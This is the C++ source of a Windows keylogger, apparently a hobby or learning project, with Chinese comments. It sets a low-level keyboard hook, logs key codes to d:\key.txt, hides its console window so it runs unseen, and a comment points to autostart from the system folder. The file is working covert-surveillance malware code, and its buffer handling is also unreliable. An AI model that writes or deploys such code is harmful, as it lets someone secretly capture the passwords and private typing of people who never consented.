/* define sought to deal with the undefined of the KBDLLHOOKSTRUCT*/
#ifndef WINVER
#define WINVER 0x0500
#endif

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif


#define STRICT
#define WIN32_LEAN_AND_MEAN
#define WH_KEYBOARD_LL 13
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <io.h> 

DWORD   g_main_tid = 0;
HHOOK   g_kb_hook   = 0;
int KEY_NUM = 0;
char key_arr[100];

bool hook();

BOOL CALLBACK con_handler (DWORD)
{
	PostThreadMessage (g_main_tid, WM_QUIT, 0, 0);
	return TRUE;
};

/* It does not used!*/
LRESULT CALLBACK kb2_proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	char ch=0;
	FILE *fl;
	//printf("%d  %d  %d\n", nCode, wParam, lParam );
	if( ((DWORD)lParam&0x40000000) && (HC_ACTION==nCode) ) //有键按下
	{
		//if( (wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100) )
		//{
		fl=fopen("key.txt","a+");    //输出到key.txt文件
		if (wParam==VK_RETURN)
		{
			ch=' ';
		}
		else
		{
			BYTE ks[256];
			GetKeyboardState(ks);
			WORD w;
			UINT scan=0;
			ToAscii(wParam,scan,ks,&w,0);
			//ch=MapVirtualKey(wParam,2); //把虚键代码变为字符
			ch =char(w); 
		}
		fwrite(&ch, sizeof(char), 1, fl);
		//}
		fclose(fl);
	}
	return CallNextHookEx( g_kb_hook, nCode, wParam, lParam ); 
	
}

/* used to process keyboard*/
LRESULT CALLBACK kb_proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* pStruct = (KBDLLHOOKSTRUCT*)lParam;
	//LPCSTR log = GetKeyName(pStruct->vkCode);
	if (wParam == WM_KEYDOWN )
	{
    key_arr[KEY_NUM] = pStruct->vkCode;
    if( KEY_NUM++ >= 30 )
    {
      key_arr[30] = '\0';
	  FILE *fl = fopen("d:\\key.txt","a+");
	  fprintf( fl, "%s", key_arr );
	  fclose(fl);

      KEY_NUM = 0;
      strcpy( key_arr, "" );
    }
	}
	return CallNextHookEx( g_kb_hook, nCode, wParam, lParam );
}

bool hook()
{
	g_main_tid = GetCurrentThreadId ();
	SetConsoleCtrlHandler (&con_handler, TRUE);
	g_kb_hook = SetWindowsHookEx (
		WH_KEYBOARD_LL,
		&kb_proc,
		GetModuleHandle (NULL), //　不能为NULL，否则失败
		0);
	if (g_kb_hook == NULL)
	{
		fprintf (stderr,
			"SetWindowsHookEx failed with error %d\n",
			::GetLastError ());
		return 0;
	};
	// 消息循环是必须的，想知道原因可以查msdn
	MSG msg;
	while (GetMessage (&msg, NULL, 0, 0))
	{
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	};
	UnhookWindowsHookEx (g_kb_hook);
	
	return 0;
}


int main()
{
	
	//开机自动隐藏窗口
	HWND hwnd;
	hwnd = FindWindow( "ConsoleWindowClass", NULL );//找到当前窗口句柄
	if( hwnd )
	{
		ShowOwnedPopups(hwnd,SW_HIDE);//显示或隐藏由指定窗口所有的全部弹出式窗口
		ShowWindow(hwnd,SW_HIDE);//控制窗口的可见性
		//WinExec 函数: 控制窗口的显示形式
		//假如开机自动运行: C:\\WINDOWS\\SYSTEM32\\KeyboardRec.exe
		//WinExec( auto_load, SW_HIDE );
	}
	
	while(1)
	{
		hook(); /* enter hook */
	}
	
	return 0;
}

